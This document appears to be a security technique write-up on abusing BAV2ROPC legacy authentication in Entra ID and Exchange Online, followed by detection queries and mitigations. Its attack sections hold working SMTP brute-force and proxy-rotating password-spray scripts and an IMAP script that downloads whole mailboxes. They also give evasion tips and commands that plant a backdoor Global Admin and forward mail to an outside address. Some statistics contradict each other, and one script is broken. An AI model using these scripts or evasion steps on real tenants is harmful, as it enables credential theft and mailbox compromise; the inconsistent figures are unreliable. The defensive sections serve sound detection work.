# [REALWORLD-001]: BAV2ROPC Attack Chain

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-001 |
| **MITRE ATT&CK v18.1** | [T1110.003 - Brute Force: Password Spraying](https://attack.mitre.org/techniques/T1110/003/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID / M365 |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All Entra ID tenant versions; Exchange Online (all versions) |
| **Patched In** | N/A - Requires architectural mitigation (BAV2ROPC cannot be "patched", only disabled) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** BAV2ROPC (Basic Authentication Version 2 Resource Owner Password Credentials) is a legacy authentication mechanism in Entra ID that converts basic authentication credentials into OAuth 2.0 access tokens transparently. This undocumented protection system allows applications using basic authentication (username/password) to obtain Entra ID tokens without requiring modern authentication protocols. Critically, BAV2ROPC bypasses Multi-Factor Authentication (MFA) enforcement, Conditional Access policies, and interactive authentication challenges, making it an ideal attack vector for credential-based assaults.

**Attack Surface:** BAV2ROPC primarily affects legacy email protocols (SMTP AUTH, POP3, IMAP4) and outdated mail clients that do not support OAuth 2.0. The vulnerability is tenant-level, affecting all users where legacy authentication has not been explicitly disabled. Between March 18 and April 7, 2025, sophisticated threat actors conducted a coordinated campaign exploiting BAV2ROPC, demonstrating 138% escalation in attack intensity and achieving 9,000+ suspicious login attempts in a single week.

**Business Impact:** Successful BAV2ROPC exploitation leads to complete mailbox compromise, data exfiltration, internal phishing campaigns, and lateral movement to privileged accounts. Unlike modern authentication flows, BAV2ROPC leaves minimal forensic evidence in interactive sign-in logs, complicating incident response. Real-world incidents show attackers using compromised accounts to dismiss additional login attempts, enabling mass compromise of subordinate user accounts.

**Technical Context:** BAV2ROPC attacks typically manifest as rapid-fire authentication attempts (6,444 attempts/day observed), originating from distributed IP infrastructure. Detection is difficult because BAV2ROPC generates non-interactive sign-in logs (marked as `NonInteractiveUserSignInLogs`) which are often overlooked during security monitoring. Threat actors exploit BAV2ROPC in phases: initial reconnaissance (low volume), sustained credential testing (medium volume), and brute force/spray campaigns (high volume, distributed).

### Operational Risk

- **Execution Risk:** **High** – Completely irreversible compromise if attacker gains access. No logout capability exists to remotely terminate BAV2ROPC sessions.
- **Stealth:** **High** – Non-interactive sign-in logs bypass alerting rules not explicitly configured for `NonInteractiveUserSignInLogs`. Standard Conditional Access does not block BAV2ROPC.
- **Reversibility:** **No** – Once credentials are compromised via BAV2ROPC, password reset is required and mailbox contents are irrecoverable.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Microsoft 365 Benchmark** | 1.1.2 | Disable legacy authentication mechanisms; ensure MFA enforcement across all authentication protocols |
| **DISA STIG** | SI-2 | Information System Security Planning; disable deprecated authentication protocols |
| **CISA SCuBA** | EXO.01.04 | Disable Basic Authentication for Exchange protocols |
| **NIST 800-53** | IA-2, IA-4 | Multi-factor authentication and user authentication; enforce modern authentication standards |
| **GDPR** | Art. 32 | Security of Processing; organizations must ensure authentication mechanisms meet contemporary security standards |
| **DORA** | Art. 9 | Protection and Prevention; critical entities must disable legacy authentication mechanisms |
| **NIS2** | Art. 21 | Cyber Risk Management Measures; enforce modern authentication for identity infrastructure |
| **ISO 27001** | A.9.2.1, A.9.2.3 | User registration; Management of Privileged Access Rights; enforce MFA and disable legacy auth |
| **ISO 27005** | Risk Scenario | "Compromise of Administration Interface via Legacy Protocol"; inherent risk of basic authentication |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** None – Threat actor only requires valid or compromised username/password.
- **Required Access:** Network access to Entra ID legacy authentication endpoints (SMTP, POP, IMAP ports).

**Supported Versions:**
- **Entra ID:** All versions (2019-2025)
- **Exchange Online:** All versions
- **Mail Clients:** Any client using basic authentication (Outlook 2013-2021 legacy configurations, Apple Mail, Thunderbird with basic auth, custom applications)

**Prerequisites for Attack Success:**
- Legacy authentication must not be globally disabled in the tenant
- Per-user legacy auth settings must not override tenant policies
- MFA must not be enforced via Conditional Access policies targeting `NonInteractiveUserSignInLogs` or legacy client apps
- Attacker must possess valid or commonly-used credentials (from breaches, password sprays)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Cloud-Specific Reconnaissance (PowerShell / Azure CLI)

**Check if legacy authentication is enabled at tenant level:**

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline

# Check tenant-wide authentication policy settings
Get-AuthenticationPolicy | Select-Object Name, AllowBasicAuthSmtp, AllowBasicAuthPop, AllowBasicAuthImap

# Check if modern authentication is enforced
Get-OrganizationConfig | Select-Object OAuth2ClientProfileEnabled

# Check if SMTP AUTH is globally disabled
Get-TransportRule | Where-Object { $_.Name -like "*SMTP*" } | Select-Object Name, Enabled
```

**What to Look For:**
- `AllowBasicAuthSmtp: $true` – **CRITICAL FINDING**: SMTP AUTH via basic authentication is enabled
- `AllowBasicAuthPop: $true` – POP3 with basic auth is enabled
- `AllowBasicAuthImap: $true` – IMAP4 with basic auth is enabled
- `OAuth2ClientProfileEnabled: $false` – Modern OAuth 2.0 is not enforced
- If any of these are `$true`, the tenant is vulnerable to BAV2ROPC attacks

**Check for users with legacy auth overrides (per-mailbox settings):**

```powershell
# Get all mailboxes with POP/IMAP/SMTP enabled (legacy auth at user level)
Get-CASMailbox -Filter { PopEnabled -eq $true -or ImapEnabled -eq $true -or SmtpClientAuthenticationDisabled -eq $false } | 
  Select-Object UserPrincipalName, PopEnabled, ImapEnabled, SmtpClientAuthenticationDisabled

# If the result set is large (>50 mailboxes), legacy auth is widely enabled
```

**What This Means:**
- Per-user settings override tenant policies, allowing legacy auth to persist even if globally "disabled"
- Threat actors specifically target these mailboxes
- Default settings in new tenants leave most users vulnerable

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: BAV2ROPC Brute Force via SMTP AUTH

**Supported Versions:** Entra ID 2019-2025, Exchange Online (all versions)

#### Step 1: Credential Enumeration/Acquisition
**Objective:** Obtain valid or commonly-used credentials (phishing, breach databases, password sprays)

**Reconnaissance Command:**

```powershell
# Query O365 for valid usernames (requires legitimate access)
# Threat actors typically use breach datasets or conduct low-volume enumeration first
Get-Mailbox | Select-Object UserPrincipalName | Export-Csv valid_users.csv
```

**What This Means:**
- Attackers often use breach databases (e.g., LinkedIn, HIBP, Dark Web credentials)
- Alternatively, they conduct low-volume username enumeration (178/hour observed in real-world campaign)
- Once a username is confirmed, brute force or spray attacks begin

**OpSec & Evasion:**
- Use distributed IPs to avoid rate limiting (real-world campaign used 13+ unique IPs)
- Space attempts across time windows (avoid >100 attempts/hour from single IP)
- Detection likelihood: **Medium-High** (if Conditional Access rules specifically target non-interactive auth)

---

#### Step 2: SMTP AUTH Brute Force Attack
**Objective:** Attempt password authentication via SMTP protocol without MFA

**Tool:** Any SMTP client capable of basic authentication (Python `smtplib`, `sendmail`, custom tools)

**Python Example (SMTP Brute Force):**

```python
#!/usr/bin/env python3
import smtplib
import sys
import time

def smtp_brute_force(target_user, password_list, smtp_host="smtp.office365.com", smtp_port=587):
    """
    Brute force SMTP AUTH against Exchange Online
    BAV2ROPC will convert basic auth to OAuth 2.0 transparently
    """
    for password in password_list:
        try:
            server = smtplib.SMTP(smtp_host, smtp_port, timeout=10)
            server.starttls()  # TLS required
            server.login(target_user, password)
            print(f"[+] SUCCESS: {target_user}:{password}")
            server.quit()
            return True
        except smtplib.SMTPAuthenticationError:
            print(f"[-] FAILED: {target_user}:{password}")
            server.quit()
            time.sleep(0.5)  # Rate limiting evasion
        except smtplib.SMTPException as e:
            print(f"[!] SMTP Error: {e}")
            time.sleep(2)
        except Exception as e:
            print(f"[!] Connection error: {e}")
    
    return False

# Read password list from file
with open("passwords.txt", "r") as f:
    passwords = f.read().splitlines()

# Target user
target_user = "victim@company.onmicrosoft.com"

# Perform brute force
smtp_brute_force(target_user, passwords)
```

**Expected Output (On Success):**

```
[+] SUCCESS: victim@company.onmicrosoft.com:Welcome123
```

**What This Means:**
- Successful SMTP AUTH via BAV2ROPC means attacker can send emails on behalf of the victim
- No MFA prompt is displayed
- Attacker does NOT have access to the mailbox (only send capability)
- Next phase: Escalate to mailbox access via POP/IMAP

**OpSec & Evasion:**
- Distribute attempts across multiple source IPs
- Use residential proxies to avoid datacenter IP blocking
- Randomize time delays between attempts (0.5-5 seconds)
- Real-world campaign used 534-1,437 attempts/hour (peak at 6,444/day)
- Detection likelihood: **High** (if SMTP auth logs are monitored)

**Troubleshooting:**
- **Error:** `SMTPAuthenticationError: 535 5.7.139 Authentication unsuccessful`
  - **Cause:** Password is incorrect, or MFA is enforced via Conditional Access
  - **Fix:** Verify password is correct; check if MFA enforcement is universal
  
- **Error:** `535 5.7.30 Basic authentication is not supported`
  - **Cause:** Tenant has disabled SMTP AUTH globally (or timeline has passed April 30, 2026)
  - **Fix:** Attack is no longer viable; only OAuth 2.0 is supported

**References & Proofs:**
- [Red Canary - BAV2ROPC Analysis](https://redcanary.com/blog/threat-detection/bav2ropc/)
- [Guardz Research - Legacy Loophole Campaign](https://guardz.com/blog/the-legacy-loophole-how-attackers-are-exploiting-entra-id-and-what-to-do-about-it/)
- [Microsoft - OAuth 2.0 ROPC Grant](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth-ropc)

---

#### Step 3: IMAP/POP3 Access for Mailbox Compromise
**Objective:** Once credentials are confirmed, access full mailbox contents via IMAP or POP3

**IMAP Example (IMAPClient Python Library):**

```python
#!/usr/bin/env python3
from imapclient import IMAPClient
import ssl

def imap_mailbox_access(username, password, imap_host="outlook.office365.com"):
    """
    Access mailbox via IMAP (legacy basic auth)
    BAV2ROPC converts credentials to OAuth tokens
    """
    try:
        # Connect via IMAP with TLS
        ssl_context = ssl.create_default_context()
        imap = IMAPClient(imap_host, ssl=True, ssl_context=ssl_context)
        
        # Authenticate with basic auth (BAV2ROPC will intercept and convert)
        imap.login(username, password)
        print(f"[+] IMAP Login successful for {username}")
        
        # Select INBOX
        imap.select_folder("INBOX")
        
        # Fetch all message UIDs
        messages = imap.search(['ALL'])
        print(f"[+] Found {len(messages)} messages in INBOX")
        
        # Download all emails
        for msg_id in messages:
            response = imap.fetch(msg_id, ['RFC822'])
            email_data = response[msg_id][b'RFC822']
            print(f"[+] Downloaded message {msg_id}")
            # Save to disk
            with open(f"email_{msg_id}.eml", "wb") as f:
                f.write(email_data)
        
        imap.logout()
        return True
    
    except Exception as e:
        print(f"[-] IMAP Error: {e}")
        return False

# Attack
username = "victim@company.onmicrosoft.com"
password = "CompromisedPassword123"
imap_mailbox_access(username, password)
```

**Expected Output:**

```
[+] IMAP Login successful for victim@company.onmicrosoft.com
[+] Found 1,247 messages in INBOX
[+] Downloaded message 1
[+] Downloaded message 2
...
```

**What This Means:**
- Attacker now has full access to the victim's mailbox
- All emails (past and future) can be read, copied, and modified
- Attacker can exfiltrate sensitive communications, credentials, or corporate data
- If victim is a privilege user (admin, executive), lateral movement is possible

**OpSec & Evasion:**
- Download emails in batches (not all at once)
- Use VPN/proxy to mask IP origin
- Do not modify folder structure (leave email as unread)
- Real-world attackers often just skim emails for sensitive info, then leave

**Troubleshooting:**
- **Error:** `b'NO [CANNOT] LOGIN failed'`
  - **Cause:** MFA enforcement or per-user auth policy is blocking IMAP
  - **Fix:** Target users without MFA enabled
  
- **Error:** `imaplib.IMAP4.error: IMAP4 response error: b'NO IMAP is currently disabled for this mailbox'`
  - **Cause:** IMAP protocol is explicitly disabled for this user
  - **Fix:** Try POP3 instead, or pivot to SMTP sending only

**References & Proofs:**
- [IMAPClient Documentation](https://imapclient.readthedocs.io/)
- [Microsoft Entra ID Legacy Auth Deprecation](https://learn.microsoft.com/en-us/exchange/clients-and-mobile-in-exchange-online/deprecation-of-basic-authentication-exchange-online)

---

### METHOD 2: Distributed BAV2ROPC Password Spraying (Real-World Campaign)

**Supported Versions:** Entra ID 2019-2025, Exchange Online (all versions)

This method follows the 3-phase attack pattern observed in the March-April 2025 Guardz campaign.

#### Step 1: Initial Reconnaissance Phase (Low Volume)
**Objective:** Identify valid usernames and test MFA status without triggering alarms

**Attack Pattern:**
- Volume: 178 attempts/hour
- Duration: 3 days (March 18-20)
- Target: Spray 10-50 commonly used passwords against known username list
- Goal: Identify accounts WITHOUT MFA enforcement

**Command (Custom Bash Script with Curl):**

```bash
#!/bin/bash
# BAV2ROPC reconnaissance via SMTP AUTH
# Low-volume, distributed reconnaissance

USERLIST="users.txt"  # One UPN per line
PASSWORD_LIST="common_passwords.txt"  # 10-50 weak passwords
PROXY_LIST="proxies.txt"  # One proxy per line

# Read user and password lists
users=$(cat $USERLIST | head -50)  # Start with 50 users
passwords=$(cat $PASSWORD_LIST | head -10)  # Test 10 passwords

for user in $users; do
    for password in $passwords; do
        # Randomize proxy
        proxy=$(shuf -n1 $PROXY_LIST)
        
        # Attempt SMTP AUTH via curl
        response=$(curl -s --proxy $proxy \
            --user "$user:$password" \
            smtp://smtp.office365.com:587 \
            -v 2>&1 | grep "235\|535")
        
        if echo $response | grep -q "235"; then
            echo "[+] SUCCESS: $user:$password" >> successful_logins.txt
        else
            echo "[-] FAILED: $user"
        fi
        
        # Rate limiting: 1 attempt per 20 seconds
        sleep 20
    done
done
```

**What This Means:**
- Attacker is testing if accounts have MFA
- If MFA is enforced, authentication fails (error 535)
- If MFA is NOT enforced, authentication succeeds (code 235) via BAV2ROPC
- Real attackers use this to build a list of "low-hanging fruit"

**OpSec & Evasion:**
- Use distributed SOCKS5 proxies (residential proxies are preferred)
- Randomize time intervals (20-60 seconds between attempts)
- Rotate user-agent strings to appear as different mail clients
- Detection likelihood: **Low** (if alerting only on successful auth, not attempts)

---

#### Step 2: Sustained Attack Phase (Medium Volume)
**Objective:** Accelerate attacks against identified vulnerable accounts; test multiple auth vectors

**Attack Pattern:**
- Volume: 534 attempts/hour
- Duration: 13 days (March 21 - April 3)
- Target: Expand password spray against accounts identified in Phase 1
- Goal: Achieve multiple successful compromises

**Bash Script (Accelerated Spray):**

```bash
#!/bin/bash
# Phase 2: Sustained password spray with expanded password list

VULNERABLE_USERS="users_without_mfa.txt"
EXPANDED_PASSWORDS="50_common_passwords.txt"
DISTRIBUTED_PROXIES="proxy_pool.txt"

# Parallel execution via GNU Parallel
cat $VULNERABLE_USERS | \
  parallel --pipe --block 10M -j 50 \
  'while read user; do
    for password in $(cat $EXPANDED_PASSWORDS); do
      proxy=$(shuf -n1 $DISTRIBUTED_PROXIES)
      curl -s --proxy $proxy \
        --user "$user:$password" \
        smtp://smtp.office365.com:587 | grep -q "235" && echo "[+] $user:$password"
    done
  done'
```

**What This Means:**
- Attack is now fully parallelized with 50+ concurrent connections
- Password list expanded from 10 to 50 passwords
- Attacker is exploiting identified vulnerable users across multiple protocols
- Real-world campaign showed expansion to IMAP/POP after successful SMTP

---

#### Step 3: Peak Brute Force Phase (High Volume, Distributed)
**Objective:** Maximum pressure; full brute force on identified targets; distributed infrastructure

**Attack Pattern:**
- Volume: 1,437-6,444 attempts/hour
- Duration: 3-4 days (April 4-7)
- Target: Unrestricted brute force against all vulnerable users
- Goal: Maximize successful compromises

**Bash Script (Full Brute Force with Distributed IPs):**

```bash
#!/bin/bash
# Phase 3: Peak brute force attack

# Rotate through 13+ IP addresses and SOCKS5 proxies
IP_ROTATION=("1.1.1.1" "1.1.1.2" "1.1.1.3" ... "1.1.1.13")
USERS="vulnerable_users.txt"
PASSWORD_DICT="10k_passwords.txt"  # Large wordlist

parallel_job() {
    local user=$1
    local password=$2
    local ip_index=$((RANDOM % 13))
    local proxy=${IP_ROTATION[$ip_index]}
    
    response=$(curl -s --proxy socks5://$proxy:1080 \
        --user "$user:$password" \
        smtp://smtp.office365.com:587 \
        -w "\n%{http_code}\n" 2>&1 | tail -1)
    
    if [[ $response == "235" ]]; then
        echo "[+] COMPROMISED: $user:$password via IP $proxy" >> compromised.txt
    fi
}

# Parallel brute force (50 concurrent jobs)
export -f parallel_job
export IP_ROTATION PASSWORD_DICT

cat $USERS | parallel -j 50 --colsep ' ' \
    'cat $PASSWORD_DICT | parallel parallel_job {} {}'
```

**Attack Intensity Chart (Real-World Campaign):**

```
March 18-20 (Recon):        178/hour
March 21 - April 3 (Test):  534/hour
April 4-5 (Peak):           6,444/hour (+138% increase)
```

**What This Means:**
- Attacker has identified multiple vulnerable targets
- Attack accelerated from 178/hour to 6,444/hour (36x increase)
- Distributed across 13+ unique IP addresses to evade rate limiting
- Real campaign yielded 9,000+ suspicious sign-in attempts in 20 days

---

#### Step 4: Post-Exploitation: Mailbox Access & Lateral Movement
**Objective:** Once credentials are compromised, attackers pivot to full account control

**Real-World Incident Pattern:**

1. **Compromise Account A** (via BAV2ROPC): Global Administrator account
2. **Mailbox Exfiltration**: Copy all emails for 5+ years of history
3. **Credential Harvesting**: Extract credentials from emails (API keys, OAuth tokens, etc.)
4. **Multi-Account Compromise**: Use Global Admin access to dismiss MFA challenges for Accounts B, C, D
5. **Lateral Movement**: Compromise executive and privileged accounts
6. **Persistence**: Create additional admin accounts; configure forwarding rules

**Commands (Post-Exploitation):**

```powershell
# Post-compromise: Create backdoor admin account
$SecurePassword = ConvertTo-SecureString -AsPlainText "P@ssw0rd123!" -Force
New-AzADUser -DisplayName "SecureAdmin" -UserPrincipalName securemin@company.onmicrosoft.com `
    -Password $SecurePassword
Add-AzADGroupMember -ObjectId (Get-AzADGroup -SearchString "Global Administrators").Id `
    -MemberObjectId (Get-AzADUser -UserPrincipalName securemin@company.onmicrosoft.com).Id

# Configure mailbox forwarding (exfiltrate all incoming mail)
Set-Mailbox -Identity victim@company.onmicrosoft.com -ForwardingAddress attacker@external.com
```

**OpSec & Evasion:**
- Use Global Admin rights to avoid being locked out
- Configure forwarding rules from multiple accounts simultaneously
- Real attackers often dismiss additional login attempts to avoid detection
- Detection likelihood: **Medium-High** (if audit logs are monitored post-breach)

**References & Proofs:**
- [Guardz - Campaign Timeline & Analysis](https://guardz.com/blog/the-legacy-loophole-how-attackers-are-exploiting-entra-id-and-what-to-do-about-it/)
- [Kroll - Real-World BAV2ROPC Incident Case Study](https://www.kroll.com/en/publications/cyber/securing-microsoft-365-avoiding-multi-factor-authentication-bypass-vulnerabilities)

---

## 5. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

**Test ID:** `T1110.003-001` (Password Spraying)

**Supported Versions:** Entra ID 2019-2025

**PowerShell Simulation (Safe Lab Environment):**

```powershell
# WARNING: Only run in isolated lab with explicit RoE authorization

# Simulate BAV2ROPC brute force attempt (using test credentials)
Invoke-AtomicTest T1110.003 -TestNumbers 1

# Expected output:
# [+] Testing T1110.003 (Brute Force - Password Spraying)
# [+] Executing spray attack against test user
# [*] 50 failed attempts detected
```

**Cleanup:**

```powershell
Invoke-AtomicTest T1110.003 -Cleanup
```

**Reference:** [Atomic Red Team Library - T1110.003](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.md)

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: Abnormal Non-Interactive Sign-In via BAV2ROPC User Agent

**Rule Configuration:**
- **Required Table:** `SigninLogs`
- **Required Fields:** `UserAgent`, `ResultType`, `Location`, `ClientAppUsed`
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To:** All Entra ID tenants

**KQL Query:**

```kusto
SigninLogs
| where TimeGenerated > ago(5m)
| where UserAgent contains "BAV2ROPC" or UserAgent contains "Outlook-iOS" or UserAgent contains "Outlook-Android"
| where ResultType != 0  // Failed auth attempts
| where ClientAppUsed in ("SMTP", "IMAP", "POP", "Other clients (legacy)")
| summarize 
    FailedAttemptCount = count(),
    UniqueUsers = dcount(UserPrincipalName),
    UniqueIPs = dcount(IPAddress),
    Countries = make_set(LocationDetails.countryOrRegion)
    by IPAddress, ClientAppUsed, UserAgent
| where FailedAttemptCount > 10
| project IPAddress, ClientAppUsed, FailedAttemptCount, UniqueUsers, UniqueIPs, Countries
```

**What This Detects:**
- Non-interactive sign-ins using legacy mail client user agents
- Failed authentication attempts from suspicious IPs
- Multiple failed attempts against different users (spray pattern)
- Geographic anomalies (impossible travel, unexpected countries)

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Detect BAV2ROPC Legacy Auth Abuse`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
5. **Incident settings Tab:**
   - Enable **Create incidents**
   - Grouping: `Enabled` (group by `UserPrincipalName`, `ClientAppUsed`)
6. Click **Review + create**

---

### Query 2: Credential Stuffing via SMTP/IMAP/POP Rapid-Fire Attempts

**KQL Query:**

```kusto
SigninLogs
| where TimeGenerated > ago(10m)
| where ClientAppUsed in ("SMTP", "IMAP", "POP", "Other clients (legacy)")
| where ResultType != 0  // Failed attempts
| summarize 
    TotalFailures = count(),
    UniqueUsers = dcount(UserPrincipalName),
    UniquePasswords = dcount(ResourceId),  // Proxy for unique password attempts
    TimeSpan = max(TimeGenerated) - min(TimeGenerated)
    by IPAddress, bin(TimeGenerated, 1m)
| where TotalFailures > 50 and TimeSpan < 5m
| project IPAddress, TotalFailures, UniqueUsers, TimeSpan
```

**Manual Configuration Steps (PowerShell):**

```powershell
# Connect to Sentinel
Connect-AzAccount
$ResourceGroup = "SecurityGroup"
$WorkspaceName = "SentinelWorkspace"

# Create the analytics rule
New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Rapid SMTP/IMAP/POP Auth Attempts (Spray Pattern)" `
  -Query @"
SigninLogs
| where TimeGenerated > ago(10m)
| where ClientAppUsed in ("SMTP", "IMAP", "POP")
| where ResultType != 0
| summarize TotalFailures = count() by IPAddress, bin(TimeGenerated, 1m)
| where TotalFailures > 50
"@ `
  -Severity "High" `
  -Enabled $true `
  -Frequency "PT5M"
```

**References:**
- [Microsoft Sentinel Documentation](https://learn.microsoft.com/en-us/azure/sentinel/overview)
- [KQL Query Language Guide](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/)

---

## 7. WINDOWS EVENT LOG MONITORING

**Note:** BAV2ROPC is cloud-only, so on-premises Event Viewer logs do not directly capture these attacks. However, if a compromised account is used to access on-premises Exchange Server or Active Directory, the following event IDs may be relevant:

**Event ID: 4768 (Kerberos Authentication Ticket Granted)**
- **Log Source:** Security (on-premises Domain Controller)
- **Trigger:** If attacker attempts to use compromised credentials for Kerberos authentication
- **Filter:** Look for failed Kerberos pre-authentication (error code 0x6) from multiple source IPs
- **Applies To Versions:** Windows Server 2016-2025

**Event ID: 4625 (Failed Logon)**
- **Log Source:** Security
- **Trigger:** Multiple failed login attempts from non-standard IPs/locations
- **Filter:** `SubStatus = 0xC0000071` (username/password invalid), `LogonType = 10` (RemoteInteractive)

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Account Logon**
3. Enable:
   - **Audit Kerberos Authentication Service**: `Success and Failure`
   - **Audit Kerberos Service Ticket Operations**: `Success and Failure`
4. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Server 2022+):**

```powershell
# Use AuditPol.exe directly
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /get /subcategory:"Kerberos Authentication Service"  # Verify
```

---

## 8. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Suspicious Sign-In from Unfamiliar Location with Legacy Client

**Alert Name:** `Suspicious sign-in activity from unfamiliar location using legacy client`

- **Severity:** High
- **Description:** Entra ID sign-in detected using legacy protocol (SMTP, IMAP, POP) from a geo-impossible or high-risk country (e.g., Nigeria, if organization is US-based)
- **Applies To:** All subscriptions with Defender for Cloud enabled
- **Remediation:**
  1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud** → **Security Alerts**
  2. Click on the alert to view details (user, IP, location)
  3. Immediately reset the user's password
  4. Enable MFA if not already enforced
  5. Review mailbox forwarding rules and recent send operations

**Manual Configuration Steps (Enable Defender for Cloud):**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, ensure:
   - **Defender for Servers**: `ON`
   - **Defender for Identity**: `ON` (covers both on-premises and cloud)
5. Click **Save**
6. Go to **Security alerts** to review triggered alerts

---

## 9. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Search for Suspicious Send Operations via SMTP

```powershell
# Connect to Compliance Center
Connect-ExchangeOnline

# Search for emails sent via SMTP (legacy)
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
  -Operations "Send" `
  -Filter @{
    "ClientInfoString" = "*Hub Transport*"  # SMTP submissions show Hub Transport
  } | 
  Where-Object { 
    $_.AuditData -like "*IsClientSubmission*true*" 
  } | 
  Select-Object UserIds, CreationDate, Operations, SourceIPAddress | 
  Export-Csv -Path "smtp_sends.csv"
```

**What to Look For:**
- Users sending large volumes of mail via SMTP (>100 messages/day)
- Send operations from unfamiliar IP addresses
- Bulk send operations at unusual times (late night, weekends)

**Manual Configuration Steps (Enable Unified Audit Log):**

1. Navigate to **Microsoft Purview Compliance Portal** (`compliance.microsoft.com`)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention to activate
5. To search:
   - Go to **Audit** → **Search**
   - Set **Date range** (Start/End)
   - Under **Activities**, select: `Send` (Mail)
   - Under **Users**, enter target user UPN (or leave blank for all)
   - Click **Search**
   - Export results: **Export** → **Download all results**

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Disable Legacy Authentication at Tenant Level**

Applies To Versions: All Entra ID tenants, Exchange Online

**Manual Steps (Microsoft 365 Admin Center):**

1. Go to **Microsoft 365 Admin Center** (`admin.microsoft.com`)
2. Navigate to **Settings** → **Org settings** → **Modern Authentication**
3. Uncheck the following:
   - **IMAP**
   - **POP**
   - **SMTP AUTH**
   - **MAPI**
   - **Exchange ActiveSync (EAS)**
   - **Exchange Web Services (EWS)**
4. Click **Save**

**Manual Steps (PowerShell - Exchange Online):**

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline

# Disable legacy authentication globally
Set-OrganizationConfig -OAuth2ClientProfileEnabled $true

# Disable SMTP AUTH for all mailboxes
Get-Mailbox | Set-CASMailbox -SmtpClientAuthenticationDisabled $true

# Disable IMAP and POP for all mailboxes
Get-Mailbox | Set-CASMailbox -ImapEnabled $false -PopEnabled $false -MAPIEnabled $false

# Verify settings
Get-OrganizationConfig | Select-Object OAuth2ClientProfileEnabled
Get-CASMailbox | Select-Object UserPrincipalName, ImapEnabled, PopEnabled, SmtpClientAuthenticationDisabled
```

**Validation Command:**

```powershell
# Verify legacy auth is disabled
Get-OrganizationConfig | Select-Object OAuth2ClientProfileEnabled
# Should return: OAuth2ClientProfileEnabled : True

# Check if SMTP AUTH is disabled for all users
Get-CASMailbox | Where-Object { $_.SmtpClientAuthenticationDisabled -eq $false } | Measure-Object
# Should return: Count: 0 (no users with SMTP AUTH enabled)
```

**Expected Output (If Secure):**
```
OAuth2ClientProfileEnabled : True
Count: 0
```

---

**Action 2: Enforce Conditional Access Policy to Block Legacy Apps**

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Block Legacy Authentication Clients`
4. **Assignments:**
   - **Users or workload identities:** `All users`
   - **Cloud apps or actions:** `All cloud apps`
5. **Conditions:**
   - **Client app types:** Select `Exchange ActiveSync clients`, `Other clients`, `Mobile apps and desktop clients`
6. **Access controls:**
   - **Grant:** Select `Block access`
7. **Enable policy:** `On`
8. Click **Create**

**Manual Steps (PowerShell):**

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"

# Create Conditional Access policy to block legacy auth
$conditions = @{
    "clientAppTypes" = @("exchangeActiveSync", "other", "mobileAppsAndDesktopClients")
}

$grantControls = @{
    "operator" = "OR"
    "builtInControls" = @("block")
}

$policy = @{
    "displayName" = "Block Legacy Authentication"
    "conditions" = $conditions
    "grantControls" = $grantControls
    "state" = "on"
}

New-MgIdentityConditionalAccessPolicy -BodyParameter $policy
```

---

**Action 3: Create Authentication Policy to Block Legacy Protocols Per-User**

**Manual Steps (PowerShell):**

```powershell
# Create authentication policy
New-AuthenticationPolicy -Name "Block Basic Auth" `
  -BlockLegacyAuthenticationProtocols $true

# Apply policy to all users
Get-User | Set-AuthenticationPolicyAssignment -AuthenticationPolicy "Block Basic Auth" -Force

# Alternatively, apply to specific group
$users = Get-AzureADGroupMember -ObjectId "GroupID"
$users | ForEach-Object {
  Set-User -Identity $_.UserPrincipalName -AuthenticationPolicy "Block Basic Auth"
}

# Verify policy is applied
Get-AuthenticationPolicy | Select-Object Name, BlockLegacyAuthenticationProtocols
```

---

**Action 4: Enforce MFA Organization-Wide**

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Require MFA for All Users`
4. **Assignments:**
   - **Users:** `All users`
   - **Cloud apps:** `All cloud apps`
5. **Conditions:**
   - **Client app types:** `All client apps`
6. **Access controls:**
   - **Grant:** Select `Require multi-factor authentication`
